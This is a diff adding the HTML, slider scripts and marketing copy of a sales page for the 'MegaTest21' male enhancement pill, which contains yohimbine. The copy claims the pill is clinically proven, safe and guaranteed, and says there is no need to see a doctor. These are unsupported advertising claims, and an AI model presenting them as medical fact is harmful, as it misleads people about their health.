+			style="z-index: 7; min-width: 510px; max-width: 510px; white-space: normal; font-size: 50px; line-height: 44px; font-weight: 800; color: rgba(195, 0, 47, 1.00);font-family:Open Sans;">ENHANCES SEXUAL PERFORMANCE? 
+		</div>
+
+		<!-- LAYER NR. 4 -->
+		<div class="tp-caption   tp-resizeme  bannerlist" 
+			 id="slide-1-layer-4" 
+			 data-x="113" 
+			 data-y="center" data-voffset="12" 
+						data-width="['198']"
+			data-height="['auto']"
+			data-transform_idle="o:1;"
+ 
+			 data-transform_in="opacity:0;s:300;e:Power2.easeInOut;" 
+			 data-transform_out="opacity:0;s:300;s:300;" 
+			data-start="500" 
+			data-splitin="none" 
+			data-splitout="none" 
+			data-responsive_offset="on" 
+
+			
+			style="z-index: 8; min-width: 198px; max-width: 198px; white-space: normal; font-size: px; line-height: 25px; font-weight: 400; color: rgba(0, 0, 0, 1.00);font-family:Open Sans;"><ul><li>Scientifically Formulated</li><li>Clinically Proven</li><li>All-Natural</li><li>Safe and Effective.</li></ul> 
+		</div>
+
+		<!-- LAYER NR. 5 -->
+		<div class="tp-caption   tp-resizeme" 
+			 id="slide-1-layer-5" 
+			 data-x="95" 
+			 data-y="bottom" data-voffset="37" 
+						data-width="['none','none','none','none']"
+			data-height="['none','none','none','none']"
+			data-transform_idle="o:1;"
+ 
+			 data-transform_in="opacity:0;s:300;e:Power2.easeInOut;" 
+			 data-transform_out="s:300;s:300;" 
+			data-start="500" 
+			data-responsive_offset="on" 
+
+			
+			style="z-index: 9;"><img src="http://www.megatest21.com/media/revslider/King-top-banner-logos.png" alt="" data-ww="317px" data-hh="126px" data-no-retina> 
+		</div>
+
+		<!-- LAYER NR. 6 -->
+		<div class="tp-caption   tp-resizeme" 
+			 id="slide-1-layer-6" 
+			 data-x="525" 
+			 data-y="bottom" data-voffset="10" 
+						data-width="['none','none','none','none']"
+			data-height="['none','none','none','none']"
+			data-transform_idle="o:1;"
+ 
+			 data-transform_in="opacity:0;s:300;e:Power2.easeInOut;" 
+			 data-transform_out="s:300;s:300;" 
+			data-start="500" 
+			data-responsive_offset="on" 
+
+			
+			style="z-index: 10;"><img src="http://www.megatest21.com/media/revslider/render-capsules.png" alt="" data-ww="auto" data-hh="auto" data-no-retina> 
+		</div>
+	</li>
+</ul>
+<div class="tp-bannertimer tp-bottom" style="visibility: hidden !important;"></div>	</div>
+<script>var htmlDiv = document.getElementById("rs-plugin-settings-inline-css"); var htmlDivCss="";
+				if(htmlDiv) {
+					htmlDiv.innerHTML = htmlDiv.innerHTML + htmlDivCss;
+                }else{
+					var htmlDiv = document.createElement("div");
+					htmlDiv.innerHTML = "<style>" + htmlDivCss + "</style>";
+					document.getElementsByTagName("head")[0].appendChild(htmlDiv.childNodes[0]);
+				}
+            </script>
+		<script type="text/javascript">
+
+			(function(jQuery) {
+
+						/******************************************
+				-	PREPARE PLACEHOLDER FOR SLIDER	-
+			******************************************/
+
+			var setREVStartSize=function(){
+				try{var e=new Object,i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;
+					e.c = jQuery('#rev_slider_1_1');
+					e.gridwidth = [1300];
+					e.gridheight = [500];
+							
+					e.sliderLayout = "fullwidth";
+					if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})
+					
+				}catch(d){console.log("Failure at Presize of Slider:"+d)}
+			};
+						
+				
+			setREVStartSize();
+			function revslider_showDoubleJqueryError(sliderID) {
+					var errorMessage = "Revolution Slider Error: You have some jquery.js library include that comes after the revolution files js include.";
+					errorMessage += "<br> This includes make eliminates the revolution slider libraries, and make it not work.";
+					errorMessage += "<br><br> To fix it you can:<br>&nbsp;&nbsp;&nbsp; 1. In the Slider Settings -> Troubleshooting set option:  <strong><b>Put JS Includes To Body</b></strong> option to true.";
+					errorMessage += "<br>&nbsp;&nbsp;&nbsp; 2. Find the double jquery.js include and remove it.";
+					errorMessage = "<span style='font-size:16px;color:#BC0C06;'>" + errorMessage + "</span>";
+						jQuery(sliderID).show().html(errorMessage);
+				}
+						var tpj=jQuery;
+			
+			var revapi1;
+			tpj(document).ready(function() {
+				if(tpj("#rev_slider_1_1").revolution == undefined){
+					revslider_showDoubleJqueryError("#rev_slider_1_1");
+				}else{
+					revapi1 = tpj("#rev_slider_1_1").show().revolution({
+						sliderType:"standard",
+jsFileLocation:"http://www.megatest21.com/skin/frontend/megatest/default/nwdthemes/revslider/public/assets/js/",
+						sliderLayout:"fullwidth",
+						dottedOverlay:"none",
+						delay:9000,
+						navigation: {
+							keyboardNavigation:"off",
+							keyboard_direction: "horizontal",
+							mouseScrollNavigation:"off",
+							onHoverStop:"on",
+							touch:{
+								touchenabled:"on",
+								swipe_threshold: 75,
+								swipe_min_touches: 50,
+								swipe_direction: "horizontal",
+								drag_block_vertical: false
+							}
+						},
+						visibilityLevels:[1240,1024,778,480],
+						gridwidth:1300,
+						gridheight:500,
+						lazyType:"none",
+						parallax: {
+							type:"mouse",
+							origo:"slidercenter",
+							speed:2000,
+							levels:[2,3,4,5,6,7,12,16,10,50,47,48,49,50,51,55],
+							type:"mouse",
+						},
+						shadow:0,
+						spinner:"spinner2",
+						stopLoop:"off",
+						stopAfterLoops:-1,
+						stopAtSlide:-1,
+						shuffle:"off",
+						autoHeight:"off",
+						disableProgressBar:"on",
+						hideThumbsOnMobile:"off",
+						hideSliderAtLimit:0,
+						hideCaptionAtLimit:0,
+						hideAllCaptionAtLilmit:0,
+						debugMode:false,
+						fallbacks: {
+							simplifyAll:"off",
+							nextSlideOnWindowFocus:"off",
+							disableFocusListener:false,
+						}
+					});
+				}
+			});	/*ready*/
+			})($nwd_jQuery);
+		</script>
+		<script>
+					var htmlDivCss = ' #rev_slider_1_1_wrapper .tp-loader.spinner2{ background-color: #FFFFFF !important; } ';
+					var htmlDiv = document.getElementById('rs-plugin-settings-inline-css');
+					if(htmlDiv) {
+						htmlDiv.innerHTML = htmlDiv.innerHTML + htmlDivCss;
+					}
+					else{
+						var htmlDiv = document.createElement('div');
+						htmlDiv.innerHTML = '<style>' + htmlDivCss + '</style>';
+						document.getElementsByTagName('head')[0].appendChild(htmlDiv.childNodes[0]);
+					}
+					</script>
+					</div><!-- END REVOLUTION SLIDER --></div>
+<div><div class="mainWidth p-t-10 p-b-55">
+<div class="row">
+<div class="col-md-12">
+<hgroup class="headingTxt">
+<h2>Feel Confident and Sexual Again &ndash;<br /> <span>Promote Healthy Testosterone Levels.*</span></h2>
+</hgroup>
+</div>
+<div class="col-md-5">
+<ul class="checkList">
+<li>Enhanced Sexual Performance*</li>
+<li>Increased Libido and Arousal*</li>
+<li>Powerful Orgasms*</li>
+<li>Enhanced Sexual Performance and Sex Drive*</li>
+<li>Harder and Longer Erections*</li>
+<li>Elevated Mood, Energy and Excitement*</li>
+<li>Lean Muscle Mass Gains, Better Cardiovascular Health</li>
+</ul>
+</div>
+<div class="col-md-7 m-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/graph-blood-1.png" /></div>
+</div>
+</div>
+<div class="gray-col">
+<div class="mainWidth p-45-0 p-b-20">
+<div class="row">
+<div class="col-md-7">
+<hgroup class="headingTxt mintxt m-b-15">
+<h2><span>Nobody Wants</span> Low Testosterone Levels.</h2>
+</hgroup>
+<ul class="normalList">
+<li>Your so-called bedroom prowess can be disappointing, even frustrating</li>
+<li>Chances are your <strong>lack of sexual desire</strong> is hindering your relationship</li>
+<li><strong>You feel tired, lethargic, even depressed</strong> at times</li>
+<li>You <strong> can't get it up </strong>when you want</li>
+<li>You worry about your performance between the sheets and <strong>can't pleasure her for long</strong></li>
+<li>You feel <strong>sluggish </strong>and <strong>unmotivated</strong>, and <strong>have no energy </strong>to enjoy life to the fullest</li>
+<li>You're <strong>losing muscle mass</strong> and aren&rsquo;t as chiseled and fit as you used to be</li>
+<li>You look in the mirror and <strong>don't recognize yourself</strong>, the growing belly bulges over your belt</li>
+<li>You feel like your memory is playing tricks on you</li>
+</ul>
+<hgroup class="headingTxt mintxt p-t-30 p-b-20 m-b-0">
+<h2>What Does Your Future Look Like?<br /> <span> Bleak or Bright?</span></h2>
+</hgroup>
+<p><strong>Aren&rsquo;t you supposed to be having the best sex of your life now? You&rsquo;re older and more experienced, shouldn&rsquo;t you be excited and more adventurous in the bedroom?</strong></p>
+<br />
+<p>Instead your performance is blah at best, your orgasms aren&rsquo;t as powerful as they used to be and sometimes your sex drive is so low, you rather not engage between the sheets. What&rsquo;s worse, is that your lack of stamina and libido is affecting your relationship. No erections, no desire, no pleasurable moments anymore. In a nutshell, you just feel old, undesirable and unmotivated&ndash; <strong>but it doesn&rsquo;t have to be that way&hellip;</strong></p>
+</div>
+<div class="col-md-5 m-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/low-test-images-1.jpg" /><br /><br /> <img alt="" src="http://www.megatest21.com/media/wysiwyg/low-test-images-2.jpg" />
+<h3 class="sideheading">Common symptoms of Low Testosterone</h3>
+<ul class="sidelist">
+<li>Lack of Sexual Desire</li>
+<li>Decreased Confidence in The Bedroom</li>
+<li>Decreased Longevity and Endurance</li>
+<li>Loss of Muscle Mass</li>
+<li>Fatigue and Weakness</li>
+<li>Unwanted Weight Gain</li>
+<li>Poor Memory</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="mainWidth p-45-0">
+<div class="row">
+<div class="col-md-5 m-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/doctor-render-3.jpg" /></div>
+<div class="col-md-7">
+<hgroup class="headingTxt mintxt">
+<h2><span>Cutting-Edge Male Enhancement Pill <br /> </span>Finally Cracks the Code On Low Testosterone Levels&hellip;</h2>
+</hgroup>
+<div class="text-col">
+<p>MegaTest21TM is a male enhancement pill boasting an all-in-one proprietary blend of clinically-researched and proven ingredients that will take your sex life to the next level. Think harder and stronger erections! Better stamina and endurance! Greater sexual arousal and libido! Increased excitement! Even support for lean muscle mass gains and cardiovascular health! Best of all, your confidence will reach new heights.</p>
+<p>The proprietary blend is formulated with powerful, ingredients shown to help increase blood flow in the penis and support healthy testosterone levels in a capsule form. There&rsquo;s no need to see a doctor or get a prescription. No need to take painful, illegal injections or drugs either.</p>
+</div>
+<ul class="checkList row">
+<li class="col-sm-6">Easy to Take</li>
+<li class="col-sm-6">Non-Prescription</li>
+<li class="col-sm-6">Cost Effective</li>
+<li class="col-sm-6">It Really Works!</li>
+<li class="col-sm-6">100% Guaranteed</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="gray-col" style="background: #e9e9e9;">
+<div class="mainWidth p-45-0">
+<div class="row">
+<div class="col-md-5 col-md-offset-1"><img class="pull-right" alt="" src="http://www.megatest21.com/media/wysiwyg/capsule-circle-65.jpg" /></div>
+<div class="col-md-6">
+<hgroup class="headingTxt">
+<h2 class="font50">Clinically-Proven <span>Herbs and Extracts:</span></h2>
+</hgroup>
+<ul class="normalList">
+<li><strong>Trigonella Foenum-Graecum</strong></li>
+<li><strong>Zinc</strong></li>
+<li><strong>Yohimbine HCL</strong></li>
+<li><strong>Mondia Whitei</strong></li>
+<li><strong>Satureja Khuzestanica</strong></li>
+<li><strong>Eucommia Ulmoides Extract</strong></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="text-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/triangle-grey.png" /></div>
+<div class="mainWidth p-45-0 text-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/Ingredients-chart-4.jpg" /></div>
+<div class="gray-col blackbg">
+<div class="mainWidth">
+<div class="col-md-3 text-center"><img class="m-t-22" alt="" src="http://www.megatest21.com/media/wysiwyg/render-3.png" /></div>
+<div class="col-md-9">
+<hgroup class="headingTxt lightHeading">
+<h2><i><span>Feel</span> Confident and Sexual </i><span>Again</span></h2>
+</hgroup>
+<button class="btn btn-block red-Btn" onclick="setLocation('http://www.megatest21.com/store.html')" type="">TRY IT NOW</button> <img alt="" src="http://www.megatest21.com/media/wysiwyg/encryption-1.png" /></div>
+</div>
+</div>
+<div class="gray-col" style="background: #e9e9e9;">
+<div class="mainWidth p-45-0">
+<div class="row">
+<div class="col-md-7">
+<hgroup class="headingTxt">
+<h2>The Science<span> Behind Low Testosterone.</span></h2>
+</hgroup>
+<p>Testosterone is the hormone that makes a man, a MAN. Unfortunately, as early as 30 years old, testosterone levels start to drop. Not ideal, is it? Research has shown that test levels actually decline in men by about 1% to 2% a year after the age of 30. So by the time a man reaches his 80s, more than half of his testosterone is gone! Over 5 million men in the United States are diagnosed with low test levels and are being treated for it. It gets worse! The International Journal of Clinical Practice predicts that there are another 12.5 million men in the U.S. who have low testosterone and a hormone deficiency, but just haven&rsquo;t been diagnosed or seeking treatment. Are you one of these men?</p>
+<p>Low testosterone doesn&rsquo;t only affect sex drive and performance in the bedroom, it can also create a number of medical and health problems, not to mention a long list of physical and appearance changes. Signs include loss of energy, loss of lean muscle, poor memory, depression, even a decline in sleep quality. And it doesn&rsquo;t stop there. Fat build-up in the abdominal area and brittle bones are also part of it.</p>
+</div>
+<div class="col-md-5 text-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/test-chart.jpg" /><br /><br /> <img alt="" src="http://www.megatest21.com/media/wysiwyg/test-loss-per-year.jpg" /></div>
+</div>
+</div>
+</div>
+<div class="mainWidth p-45-0">
+<div class="col-md-5 text-center"><img alt="" src="http://www.megatest21.com/media/wysiwyg/IMAGINE-2.jpg" /></div>
+<div class="col-md-7">
+<hgroup class="headingTxt">
+<h2>A Whole New<span>, More Confident YOU!</span></h2>
+</hgroup>
+<hr />
+<p>With MegaTest21TM, you can become the man you once were&mdash;and want to be again. This male enhancement pill can promote healthy testosterone levels. Remember playing hard? Working hard? Being ready for sex at the drop of a hat? With MegaTest21TM you can look forward to:</p>
+<div class="row">
+<div class="col-sm-6">
+<ul class="ltsr checkList">
+<li>1. Increased Libido and Vitality*</li>
+<li>2. Improved Sexual Performance*</li>
+<li>3. Harder, Stronger Erections*</li>
+<li>4. Added Endurance and Stamina*</li>
+</ul>
+</div>
+<div class="col-sm-6">
+<ul class="ltsr checkList">
+<li>5. More Energy and Excitement*</li>
+<li>6. Elevated Mood and Confidence*</li>
+<li>7. Accelerated Recovery Time*</li>
+<li>8. Support Bio-Available and Free Testosterone Levels*</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="mainWidth p-45-0">
+<div class="col-md-6 text-center"><a href="http://www.megatest21.com/store.html"><img class="sr-m-b-20" alt="" src="http://www.megatest21.com/media/wysiwyg/price-1-bottle-2.jpg" /></a></div>
+<div class="col-md-6 text-center"><a href="http://www.megatest21.com/store.html"><img alt="" src="http://www.megatest21.com/media/wysiwyg/price-3-bottle-2.jpg" /></a></div>
+</div></div></div>                </div>
+            </div>
+        </div>
+                
+    <!-- <div class="footer">
+                <address class="copyright"></address>
+    </div> -->
+    <footer id="footer" class="clearfix">
+    <div class="contaienr text-center">
+      <div class="footer-logo">
+        <a href="http://www.megatest21.com/">
+          <img src="http://www.megatest21.com/skin/frontend/megatest/default/images/logo.png" />
+        </a>
+      </div>
+      <!-- <div class="social-icons">
+        <ul>
+          <li>
+            <a href="javascript:void"><i class="fa fa-facebook-f"></i></a>
+          </li>
+          <li>
+            <a href="javascript:void"><i class="fa fa-instagram"></i></a>
+          </li>
+          <li>
+            <a href="https://www.twitter.com" target="_blank"><i class="fa fa-twitter"></i></a>
+          </li>
+          <li>
+            <a href="javascript:void"><i class="fa fa-youtube"></i></a>
+          </li>
+        </ul>
+      </div> -->
+      <div class="footer-menu">
+        <ul>
+          <li>
+            <a href="http://www.megatest21.com/">HOME</a>
+          </li>
+          <li>
+            <a href="http://www.megatest21.com/science.html">SCIENCE</a>
+          </li>
+          <li>
+            <a href="http://www.megatest21.com/testimonials.html">TESTIMONIALS</a>
+          </li>
+          <li>
+            <a href="http://www.megatest21.com/faqs.html">FAQs</a>
+          </li>
+          <li>
+            <a href="http://www.megatest21.com/contact.html">CONTACT</a>
+          </li>
+          <li>
+            <a href="http://www.megatest21.com/affiliates/account/register/">AFFILIATES</a>
+          </li>
+		    </ul>
+      </div>
+      <p class="copyright">
+        <a href="javascript:void(0);">&copy; 2016  INTEGRATED SCIENCE TECHNOLOGIES</a>
+      </p>
+    </div>
+  </footer>
+  
+<div class="body-back-to-top"><i class="dfd-icon-up_2"></i></div>
+<script type="text/javascript">
+(function ($) {
+
+     'use strict';
+
+
+
+     $(window).scroll(function () {
+
+       if($(this).scrollTop() > 100) {
+
+        $('.body-back-to-top').css('opacity','1');
+
+       }
+
+       if($(this).scrollTop() < 200) {
+
+        $('.body-back-to-top').css('opacity','0');
+
+       }
+
+     });
+
+    $('.body-back-to-top').click(function (event) {
+
+       event.preventDefault();
+
+       $('body,html').animate({ scrollTop: 0}, function(){
+
+        $('.body-back-to-top').css('opacity','0');
+
+       });
+
+     });
+
+  })(jQuery);
+</script>                
+
+
+<div style="display:none" class="bg-fade" onclick="closeAffPopup();" id="bg-fade">&nbsp;</div>
+<div style="display:none" class="aff-popup" id="aff-popup">
+    <a class="close-affpopup hidden-xs" href="javascript:void(0);" onclick="closeAffPopup();"><img src="http://www.megatest21.com/skin/frontend/megatest/default/css/magestore/images/close.png"/></a>
+    <div class="popup-content" id="popup-content"><span class="no-content">&nbsp;</span></div>
+</div>
+<script type="text/javascript">
+    //var $pop = jQuery.noConflict();
+    function affPopup(element){
+        $('bg-fade').show();
+        $('aff-popup').show();
+        $('aff-popup').addClassName('active');
+        if(element == null){
+            
+        }else{
+            var off = element.cumulativeOffset();
+            $('aff-popup').setStyle({
+                'top':off[1]-$('aff-popup').getHeight()+'px',
+            });
+        }
+    }
+    function insertHtml(response_text){
+        $('aff-popup').removeClassName('active');
+        document.getElementById("popup-content").innerHTML = response_text;
+       // $('popup-content').update(response_text);
+    }
+    function closeAffPopup(){
+        var null_string='<span class="no-content"  style="float:left;width:100%;min-height: 200px;">&nbsp;</span>';
+        $('bg-fade').hide();
+        $('aff-popup').hide();
+        document.getElementById("popup-content").innerHTML =null_string;
+    }
+    function ajaxPopup(url,temp,element){
+        if(element == null){
+            affPopup(null);
+        }else{
+            affPopup(element);
+        }
+        if(temp==null){
+            new Ajax.Request(url, {
+             method: 'get',
+             onComplete: function(response) {
+               insertHtml(response.responseText);
+             }
+            });
+         }else{
+            setTimeout(function(){
+                insertHtml(temp);
+            }, 1000); 
+            
+         }
+    }
+</script>    </div>
+</div>
+<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"3577746b9c","applicationID":"27225880","transactionName":"b11QZkRVW0oDVkBdWFYXc1FCXVpXTVZZRxhRVlZXThtcVwZQTA==","queueTime":0,"applicationTime":435,"atts":"QxpTEAxPSEQ=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
+</html>
+
